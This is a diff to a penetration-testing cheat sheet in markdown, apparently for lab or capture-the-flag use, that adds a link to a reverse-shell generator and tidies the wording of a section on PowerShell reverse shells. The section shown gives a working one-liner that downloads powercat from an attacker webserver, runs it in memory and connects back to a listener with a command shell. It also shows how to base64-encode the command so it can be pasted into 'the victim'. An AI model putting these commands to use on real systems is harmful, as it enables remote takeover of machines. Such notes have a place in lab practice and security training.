@@ -107,6 +107,8 @@ sudo tcpdump ip proto \\icmp -i tun0
 ```
 ## Reverse shells
 
+https://www.revshells.com/
+
 ### Shell
 ```sh
 # Works most of the time, useful when nc has no -e option
@@ -149,15 +151,15 @@ $command="ping -n 3 10.10.10.10"
 $Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command))
 powershell.exe -encoded $Encoded
 ```
-Reverse Shell with powercat
+### Reverse Shell with powercat
 
-This downloads powercat from your webserver on port 9000 and calls back to you local listener (nc -nvlp 1234) 
+This downloads powercat from your webserver on port 9000 and calls back to your local listener (nc -nvlp 1234) 
 
 ```powershell
 $command={IEX(New-Object System.Net.WebClient).DownloadString('http://10.13.14.3:9000/powercat.ps1'); powercat -c 10.13.14.3 -p 1234 -e cmd}
 $Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command))
 ```
-The command can be prepared locally and copy/pasted to the victim, the just run:
+The command can be prepared locally and copy/pasted to the victim, then just run:
 
 ```
 powershell.exe -encoded <base64 string from $Encoded above here>
